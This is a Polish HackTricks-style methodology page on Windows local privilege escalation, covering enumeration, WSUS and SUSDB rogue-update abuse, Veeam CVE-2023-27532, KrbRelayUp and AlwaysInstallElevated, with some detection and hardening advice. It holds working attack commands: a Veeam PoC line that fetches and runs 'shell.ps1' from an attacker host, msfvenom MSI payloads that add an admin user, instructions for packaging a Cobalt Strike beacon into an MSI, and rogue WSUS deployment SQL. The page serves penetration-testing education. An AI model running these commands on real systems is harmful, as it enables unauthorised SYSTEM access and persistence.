# Eskalacja lokalnych uprawnień w Windows

{{#include ../../banners/hacktricks-training.md}}

### **Najlepsze narzędzie do wyszukiwania wektorów lokalnej eskalacji uprawnień w Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Ta strona łączy ogólną metodykę eskalacji uprawnień w Windows z kilku podstawowych poradników.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Jej praktyczny przebieg enumeracji bazuje również na warsztatach społeczności i listach kontrolnych.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Materiały dotyczące historycznych ataków obejmują prezentację DerbyCon o eskalacji uprawnień w Windows.<sup>[[5]](#references)</sup>

## Podstawy Windows

### Access Tokens

**Jeśli nie wiesz, czym są access tokens w Windows, przed kontynuowaniem przeczytaj następującą stronę:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Więcej informacji o ACLs - DACLs/SACLs/ACEs znajdziesz na następującej stronie:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Poziomy integralności

**Jeśli nie wiesz, czym są poziomy integralności w Windows, przed kontynuowaniem przeczytaj następującą stronę:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Mechanizmy zabezpieczeń Windows

W Windows istnieją różne mechanizmy, które mogą **uniemożliwić enumerację systemu**, uruchamianie plików wykonywalnych, a nawet **wykrywać Twoje działania**. Przed rozpoczęciem enumeracji pod kątem eskalacji uprawnień **przeczytaj** następującą **stronę** i **rozpoznaj** wszystkie te **mechanizmy obronne**:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Dostęp fizyczny może również umożliwić przejście od edycji UEFI NVRAM w trybie offline do DMA przed rozruchem i modyfikowania pamięci Windows `SYSTEM`:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Ochrona administratora / ciche podwyższanie uprawnień UIAccess

Procesy UIAccess uruchamiane przez `RAiLaunchAdminProcess` można wykorzystać do uzyskania High IL bez wyświetlania monitów, jeśli uda się ominąć kontrole bezpiecznej ścieżki AppInfo. Szczegółowy przebieg omijania UIAccess/Admin Protection znajdziesz tutaj:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Propagację ustawień rejestru ułatwień dostępu Secure Desktop można wykorzystać do dowolnego zapisu w rejestrze jako SYSTEM (RegPwn):<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Nowsze kompilacje Windows wprowadziły również ścieżkę LPE wykorzystującą **SMB na dowolnym porcie**, w której uprzywilejowane lokalne uwierzytelnienie NTLM jest przekazywane przez ponownie użyte połączenie TCP SMB:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Informacje o systemie

### Enumeracja informacji o wersji

Sprawdź, czy w wersji Windows występują znane podatności (sprawdź również zainstalowane poprawki).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Exploity wersji

Ta [strona](https://msrc.microsoft.com/update-guide/vulnerability) jest przydatna do wyszukiwania szczegółowych informacji o lukach w zabezpieczeniach firmy Microsoft. Ta baza danych zawiera ponad 4 700 luk w zabezpieczeniach, co pokazuje **ogromną powierzchnię ataku** w środowisku Windows.

**W systemie**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — zbiera informacje o kompilacji systemu operacyjnego, zainstalowanych aktualizacjach i wybranych potencjalnie pasujących biuletynach; przed uznaniem wyniku za właściwy sprawdź dokładny produkt i zastępujące aktualizacje.

W przypadku lokalnego exploita dla konkretnej wersji sprawdź **architekturę uruchomionego procesu**, a także architekturę systemu operacyjnego. W 64-bitowym systemie Windows 32-bitowy proces podlega [przekierowaniu systemu plików WOW64](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector): `%windir%\System32` zwykle wskazuje 32-bitowy katalog systemowy, a `%windir%\Sysnative` umożliwia temu procesowi dostęp do natywnego katalogu systemowego. Alias ten jest niedostępny dla procesu 64-bitowego. Kompilacja systemu operacyjnego lub informacja o potencjalnie brakującej aktualizacji KB nie dowodzi podatności na exploit; porównaj aktualnie uruchomioną kompilację, zainstalowaną lub zastępującą aktualizację, architekturę procesu i wymagania exploita z [biuletynem bezpieczeństwa firmy Microsoft](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) dotyczącym konkretnego problemu.

**Lokalnie, na podstawie informacji o systemie**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Repozytoria exploitów na GitHubie:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Środowisko

Czy jakieś dane uwierzytelniające/Juicy info zapisano w zmiennych środowiskowych?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### Historia PowerShella

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### Pliki transkrypcji PowerShell

Informacje o tym, jak włączyć tę funkcję, znajdziesz na stronie [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` to tylko przykład. [Zasady transkrypcji PowerShell](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) zazwyczaj zapisują pliki w folderze Documents każdego użytkownika, ale ustawienie `OutputDirectory` lub `Start-Transcript -OutputDirectory` może przekierować pliki do folderu współdzielonego lub ukrytego. Przed sprawdzeniem transkrypcji zweryfikuj efektywną ścieżkę zapisu i ACL pliku: transkrypcja może zawierać argumenty poleceń i ich wyniki, w tym dane uwierzytelniające. Dostępna do odczytu transkrypcja jest jedynie wskazówką, jeśli jej treść ujawnia dane użytecznej tożsamości o wyższych uprawnieniach, a ta tożsamość może zalogować się w odpowiednim kontekście.

### Rejestrowanie modułów PowerShell

Rejestrowane są szczegóły wykonania potoku PowerShell, w tym wykonane polecenia, ich wywołania oraz fragmenty skryptów. Nie muszą być jednak rejestrowane wszystkie szczegóły wykonania ani wyniki.

Aby to włączyć, postępuj zgodnie z instrukcjami w sekcji dokumentacji „Pliki transkrypcji”, wybierając **„Rejestrowanie modułów”** zamiast **„Transkrypcja PowerShell”**.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

Aby wyświetlić ostatnie 15 zdarzeń z logów PowerShell, możesz wykonać:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

Rejestrowana jest pełna aktywność i cała zawartość wykonywanego skryptu, dzięki czemu każdy blok kodu jest dokumentowany podczas działania. Proces ten zapewnia kompleksowy ślad audytowy każdej aktywności, przydatny w informatyce śledczej i analizie złośliwego zachowania. Dokumentowanie całej aktywności w chwili jej wykonywania pozwala uzyskać szczegółowy wgląd w przebieg procesu.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Zdarzenia rejestrowane dla Script Block można znaleźć w Podglądzie zdarzeń systemu Windows w ścieżce: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Aby wyświetlić 20 ostatnich zdarzeń, użyj:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### Ustawienia internetowe

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Dyski

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

Punkt końcowy WSUS korzystający z HTTP jest wskazówką do sprawdzenia możliwości przechwycenia metadanych aktualizacji. Wykorzystanie tej możliwości zależy również od tego, czy klient korzysta z tego serwera WSUS, czy atakujący może przechwycić lub kontrolować jego ruch oraz od zasad zaufania i instalowania aktualizacji obowiązujących na kliencie. Sam adres URL nie oznacza możliwości wykonania kodu. [Microsoft zaleca stosowanie TLS dla metadanych WSUS](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Najpierw sprawdź, czy w sieci używane są aktualizacje WSUS bez SSL, uruchamiając w cmd następujące polecenie:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Lub poniższe polecenie w PowerShellu:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Jeśli otrzymasz odpowiedź podobną do jednej z poniższych:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

A jeśli `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` lub `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` zwraca `1`.

Gdy `UseWUServer` ma wartość `1`, Windows Update korzysta ze skonfigurowanej usługi intranetowej. Potwierdza to spełnienie warunku wstępnego dla przechwytywania ruchu HTTP, ale nie dowodzi, że przechwycenie, akceptacja złośliwej aktualizacji lub jej instalacja z podwyższonymi uprawnieniami są możliwe. Gdy wartość wynosi `0`, ten konkretny skonfigurowany endpoint WSUS nie jest wybierany przez tę zasadę.

Aby wykorzystać te podatności, można użyć narzędzi takich jak [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) — to uzbrojone w exploity skrypty MiTM służące do wstrzykiwania „fałszywych” aktualizacji do nieszyfrowanego ruchu WSUS.

Przeczytaj wyniki badań:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Przeczytaj pełny raport tutaj**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
Zasadniczo ta luka polega na następującym błędzie:

> Jeśli możemy zmodyfikować ustawienia proxy naszego lokalnego użytkownika, a Windows Updates korzysta z proxy skonfigurowanego w ustawieniach Internet Explorera, możemy lokalnie uruchomić [PyWSUS](https://github.com/GoSecure/pywsus), przechwycić własny ruch i uruchomić kod z podwyższonymi uprawnieniami na naszym urządzeniu.
>
> Ponadto, ponieważ usługa WSUS korzysta z ustawień bieżącego użytkownika, używa także jego magazynu certyfikatów. Jeśli wygenerujemy certyfikat z własnym podpisem dla nazwy hosta WSUS i dodamy go do magazynu certyfikatów bieżącego użytkownika, będziemy mogli przechwytywać ruch WSUS zarówno przez HTTP, jak i HTTPS. WSUS nie stosuje mechanizmów podobnych do HSTS, które wymuszałyby weryfikację certyfikatu typu trust-on-first-use. Jeśli certyfikat jest zaufany przez użytkownika i ma prawidłową nazwę hosta, usługa go zaakceptuje.

Możesz wykorzystać tę lukę za pomocą narzędzia [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (gdy zostanie udostępnione).

### Aktualizacje WSUS publikowane i zatwierdzane przez administratora

Istnieje odrębna ścieżka, jeśli bieżąca tożsamość może **publikować i zatwierdzać** aktualizacje na serwerze WSUS. Sprawdź efektywne członkostwo w grupie `WSUS Administrators` serwera oraz wszelkie delegowane uprawnienia WSUS, a następnie ustal, która grupa komputerów klienckich otrzymałaby zatwierdzoną aktualizację. [Microsoft wymaga uprawnień administratora WSUS do zatwierdzania aktualizacji](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate), a także [opisuje relację zaufania dla publikowania](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): klienci muszą ufać certyfikatowi podpisującemu używanemu dla lokalnie publikowanej zawartości. Zanim uznasz to za ścieżkę eskalacji, potwierdź, że aktualizacja jest podpisana i akceptowana, dotyczy celu oraz zostanie zainstalowana w kontekście o wyższych uprawnieniach. Sama wartość HTTP `WUServer` lub nazwa grupy nie potwierdza spełnienia tych warunków.

### Nadużycie niestandardowych aktualizacji SUSDB: niepodpisane payloady przez `.txt`/`.esd`

To odrębne naruszenie granicy zaufania, inne niż przechwycenie połączenia HTTP WSUS: warunkiem wstępnym jest dostęp do **procedur składowanych bazy WSUS (`SUSDB`)** wystarczający do publikowania i zatwierdzania niestandardowych aktualizacji. Jedną z praktycznych ścieżek uzyskania dostępu jest przekazanie uwierzytelnienia konta komputera WSUS upstream do odrębnego serwera MSSQL hostującego `SUSDB`; dokładny warunek wstępny zależy od wdrożenia, dlatego najpierw wylicz uprawnienia `EXECUTE`, zamiast zakładać, że wymagane są uprawnienia administratora SQL.<sup>[[38]](#references)[[39]](#references)</sup>

Informacje o odrębnej ścieżce ataku, w której uwierzytelnienie klienta WSUS jest przekazywane z HTTP/8530 do LDAP, SMB lub AD CS, znajdziesz w artykule [Nadużycie HTTP WSUS do relay NTLM](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Utwórz aktualizację, wskaż jej cel i zatwierdź ją

Proces tworzenia niestandardowej aktualizacji wykorzystuje legalne procedury WSUS jako ograniczone API do publikowania. Istotne zmiany stanu to:<sup>[[38]](#references)</sup>

| Etap | Odpowiednie procedury składowane |
| --- | --- |
| Import metadanych aktualizacji | `spImportUpdate` |
| Zapis fragmentów XML dotyczących wymagań wstępnych, lokalizacji i rozszerzeń | `spSaveXMLFragment` |
| Powiązanie skrótu zawartości z kontrolowanym przez atakującego URL-em | `spSetBatchURL` |
| Wyliczenie/utworzenie grupy komputerów i dodanie klienta | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Zatwierdzenie instalacji dla tej grupy | `spDeployUpdate` z `@actionID = 0` i `@isAssigned = 1` |

Nazwa pliku, skróty, rozmiar i procedura obsługi `CommandLineInstallation` muszą być zgodne w zaimportowanych metadanych i fragmentach. Po przypisaniu URL-a zawartości i grupy docelowej końcowe zatwierdzenie wygląda następująco; zamiast ponownie używać przykładowych identyfikatorów GUID, użyj nowych identyfikatorów aktualizacji, grupy i wdrożenia.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Obejście weryfikacji podpisu sterowane rozszerzeniem

WSUS normalnie odrzuca dowolną niepodpisaną zawartość wykonywalną. Jednak w pliku `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll` ścieżka .NET `VerifyFile` ustawia flagę sprawdzania certyfikatu na false, gdy podana nazwa pliku kończy się na `.txt` lub `.esd`; `CheckCertificateSignature` zostaje wtedy pominięte bez uprzedniego sprawdzenia, czy bajty zawierają tekst lub prawidłowy obraz ESD. Dzięki temu niezmieniony plik PE o nazwie na przykład `payload.exe.txt` może przejść weryfikację zawartości, a następnie zostać uruchomiony przez procedurę obsługi instalacji aktualizacji z wiersza poleceń. Jest to błąd typu policy/type confusion, a nie fałszowanie podpisu.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### Staging i automatyzacja zgodne z BITS

Wywołanie `spDeployUpdate` powoduje, że WSUS pobiera zarejestrowaną zawartość. Serwer źródłowy musi spełniać wymagania HTTP protokołu BITS: sam dostępny URL nie wystarczy, ponieważ transfer wykorzystuje początkową sekwencję `HEAD`/`GET` oraz żądania z zakresami bajtów. Serwer bez obsługi Range powoduje błąd synchronizacji WSUS `EventId=364` z informacją, że BITS wymaga nagłówka protokołu Range.<sup>[[39]](#references)</sup>

Research PoC [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) generuje SQL wymagany do łańcucha importu/fragmentu/URL/grupy/wdrożenia, zawiera zmodyfikowanego klienta MSSQL do jego wykonania oraz udostępnia `BitsWebServer.py` do stagingu zawartości. Minimalne wywołanie w autoryzowanym laboratorium:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Nieobsługiwana instalacja i trwałość przez ponawianie prób

Interakcja po stronie klienta zależy od zasad. Ustawienie `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates`, opcja `4 - Auto download and schedule install`, powoduje pobranie i instalację zatwierdzonej aktualizacji zgodnie z skonfigurowanym harmonogramem, bez konieczności ręcznego wyboru przez użytkownika. Podczas testów ładunek, którego aktualizacja nadal kończyła się niepowodzeniem lub była niekompletna, był ponownie oferowany natychmiast po zakończeniu procesu callback, więc ponawianie prób może stać się cyklicznym mechanizmem trwałości; jest to łatwe do zauważenia, ponieważ klient zgłasza stan niepowodzenia aktualizacji.<sup>[[39]](#references)</sup>

#### Wykrywanie i sposoby wzmacniania zabezpieczeń

Przydatne punkty kontrolne po stronie serwera i klienta w tym łańcuchu to:<sup>[[39]](#references)</sup>

- Audytuj wykonywanie `spCreateTargetGroup`, `spSetBatchURL` i `spDeployUpdate` w `SUSDB`; badaj nowe grupy docelowe, zewnętrzne źródła treści, ładunki aktualizacji `.txt`/`.esd` oraz wdrożenia wykonywane przez nieoczekiwane podmioty (zwłaszcza konta inne niż komputerowe).
- Sprawdzaj `C:\Program Files\Update Services\LogFiles` pod kątem `ContentSyncAgent`, `FileVerified`, błędnie zapisanego `FileVerficationFailed` oraz `EventId=364`; koreluj weryfikację z rozszerzeniem ładunku i sygnaturą pliku, zamiast ufać rozszerzeniu.
- Wykrywaj wielokrotne niepowodzenia i ponawianie instalacji Windows Update, a także uruchamianie PE lub nieoczekiwane procesy potomne/aktywność sieciową związane z treściami o nazwach kończących się na `.txt` lub `.esd`.
- Jeśli to możliwe, wymagaj Extended Protection for Authentication dla usługi bazy danych i ogranicz dostęp sieciowy do bazy danych do serwera WSUS oraz autoryzowanych systemów administracyjnych. Ogranicz i audytuj uprawnienia `EXECUTE` do procedur obsługujących niestandardowe aktualizacje.

## Zewnętrzne programy aktualizujące i IPC agentów (local privesc)

Wiele agentów korporacyjnych udostępnia powierzchnię IPC na localhost i uprzywilejowany kanał aktualizacji. Jeśli można wymusić rejestrację z serwerem atakującego, a program aktualizujący ufa nieautoryzowanemu głównemu urzędowi certyfikacji lub stosuje słabe kontrole podpisu, lokalny użytkownik może dostarczyć złośliwy plik MSI, który usługa SYSTEM zainstaluje. Uogólnioną technikę (opartą na łańcuchu Netskope stAgentSvc – CVE-2025-0309) opisano tutaj:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM przez TCP 9401)

Veeam Backup & Replication i Cloud Connect domyślnie korzystają z podstawowej usługi kopii zapasowych na **TCP/9401**. [Zalecenia Veeam](https://www.veeam.com/kb4424) opisują nieuwierzytelnione ujawnienie zaszyfrowanych poświadczeń bazy danych konfiguracji w obrębie sieci kopii zapasowych; osobny publiczny PoC demonstruje ścieżkę wykonania poleceń jako **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup> Usługa może nasłuchiwać także poza localhost, dlatego sprawdź jej rzeczywisty adres i PID.

- **Recon**: potwierdź, że TCP/9401 należy do `Veeam.Backup.Service.exe`, a następnie sprawdź zainstalowany produkt i metadane poprawek. `netstat -ano | findstr 9401` oraz `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` to wskazówki, a nie pełna kontrola poprawek.
- **Wersje z poprawkami**: Veeam podaje **11a build 11.0.1.1261 P20230227** i **12 build 12.0.0.1420 P20230223** jako pierwsze wersje zawierające poprawkę; wcześniejsze wersje są podatne. Sama czteroczłonowa wersja pliku nie pozwala odróżnić niezałatanej kompilacji bazowej od późniejszej poprawki dla tych samych numerów kompilacji. Przed uznaniem granicznej kompilacji za poprawioną zweryfikuj identyfikator poprawki w [historii kompilacji dostawcy](https://www.veeam.com/kb2680).
- **Exploit**: umieść PoC, taki jak `VeeamHax.exe`, wraz z wymaganymi bibliotekami DLL Veeam w tym samym katalogu, a następnie uruchom ładunek SYSTEM przez lokalne gniazdo:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

Cytowany PoC demonstruje wykonanie polecenia jako SYSTEM, gdy spełnione są dodatkowe warunki wstępne; advisory producenta opisuje problem ujawnienia poświadczeń.
## KrbRelayUp

Lokalny relay Kerberos może umożliwić przejście od logowania z niższymi uprawnieniami do uprzywilejowanego zapisu w katalogu, gdy odpowiedni serwer COM przeprowadzi uwierzytelnienie, a relayed principal ma uprawnienia do obiektu docelowego. [Dokumentacja KrbRelay](https://github.com/cube0x0/KrbRelay) opisuje zapisy LDAP RBCD oraz `msDS-KeyCredentialLink` (shadow-credential); KrbRelayUp automatyzuje niektóre z tych ścieżek. Łańcuch RBCD wymaga odpowiednich uprawnień delegowania i praw do obiektu docelowego, natomiast łańcuch shadow-credential wymaga uprawnień do zapisu kluczy poświadczeń oraz KDC obsługującego ścieżkę uwierzytelniania certyfikatem. Żadna z tych ścieżek nie wynika z samego członkostwa w domenie.

Sprawdź rzeczywistą politykę kontrolera domeny (DC) dotyczącą [podpisywania LDAP](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) i [wiązania kanału LDAPS](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding), ACL obiektu tożsamości poddawanej relayowi oraz poziomy uwierzytelniania i personifikacji wybranej klasy COM. Znaczenie ma typ logowania wywołującego i kontekst poświadczeń: sesja WinRM może zachowywać się inaczej niż logowanie interaktywne lub logowanie z nowymi poświadczeniami. Wynik mogą też zmienić routing zapory/OXID i zainstalowane aktualizacje. Traktuj liberalną politykę lub pasujący ACL jako element wymagający przeglądu; pasywna enumeracja nie powinna wywoływać COM coercion, uwierzytelniania relay ani zapisów w katalogu. Shadow credential konta komputera może prowadzić do uzyskania biletu komputera, a następnie — tylko jeśli to konto ma wymagane uprawnienia replikacji katalogu — do osobnej ścieżki DCSync.

Znajdź **exploit w** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Aby uzyskać więcej informacji o przebiegu ataku, sprawdź [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

**Jeśli** te 2 klucze rejestru są **włączone** (wartość wynosi **0x1**), użytkownicy z dowolnymi uprawnieniami mogą **instalować** (uruchamiać) pliki `*.msi` jako NT AUTHORITY\\**SYSTEM**.

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Jeśli masz sesję meterpreter, możesz zautomatyzować tę technikę za pomocą modułu **`exploit/windows/local/always_install_elevated`**

### PowerUP

Użyj polecenia `Write-UserAddMSI` z power-up, aby utworzyć w bieżącym katalogu binarny plik Windows MSI służący do eskalacji uprawnień. Ten skrypt zapisuje prekompilator instalatora MSI, który wyświetla monit o dodanie użytkownika/grupy (będziesz więc potrzebować dostępu GIU):

```
Write-UserAddMSI
```

Po prostu uruchom utworzony plik binarny, aby eskalować uprawnienia.

### MSI Wrapper

Przeczytaj ten samouczek, aby dowiedzieć się, jak utworzyć MSI wrapper za pomocą tych narzędzi. Pamiętaj, że możesz opakować plik „**.bat**”, jeśli **chcesz tylko** **wykonywać** **wiersze poleceń**.


{{#ref}}
msi-wrapper.md
{{#endref}}

### Tworzenie MSI za pomocą WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Tworzenie MSI za pomocą Visual Studio

- **Wygeneruj** za pomocą Cobalt Strike lub Metasploit **nowy Windows EXE TCP payload** w lokalizacji `C:\privesc\beacon.exe`
- Otwórz **Visual Studio**, wybierz **Create a new project** i wpisz „installer” w polu wyszukiwania. Wybierz projekt **Setup Wizard** i kliknij **Next**.
- Nadaj projektowi nazwę, np. **AlwaysPrivesc**, jako lokalizację wybierz **`C:\privesc`**, zaznacz **place solution and project in the same directory** i kliknij **Create**.
- Klikaj **Next**, aż dojdziesz do kroku 3 z 4 (wybór plików do uwzględnienia). Kliknij **Add** i wybierz właśnie wygenerowany Beacon payload. Następnie kliknij **Finish**.
- Zaznacz projekt **AlwaysPrivesc** w **Solution Explorer** i w **Properties** zmień **TargetPlatform** z **x86** na **x64**.
  - Możesz zmienić też inne właściwości, takie jak **Author** i **Manufacturer**, dzięki czemu zainstalowana aplikacja może wyglądać bardziej wiarygodnie.
- Kliknij projekt prawym przyciskiem myszy i wybierz **View > Custom Actions**.
- Kliknij prawym przyciskiem myszy **Install** i wybierz **Add Custom Action**.
- Kliknij dwukrotnie **Application Folder**, wybierz plik **beacon.exe** i kliknij **OK**. Dzięki temu Beacon payload zostanie uruchomiony natychmiast po uruchomieniu instalatora.
- W sekcji **Custom Action Properties** zmień **Run64Bit** na **True**.
- Na koniec **zbuduj projekt**.
  - Jeśli pojawi się ostrzeżenie `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, upewnij się, że platforma jest ustawiona na x64.

### Instalacja MSI

Aby wykonać **instalację** złośliwego pliku `.msi` w **tle:**

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

Aby wykorzystać tę lukę, możesz użyć: _exploit/windows/local/always_install_elevated_

## Antywirusy i narzędzia wykrywające

### Ustawienia inspekcji

Te ustawienia określają, co jest **rejestrowane**, więc warto zwrócić na nie uwagę.

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding — warto wiedzieć, dokąd wysyłane są logi.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

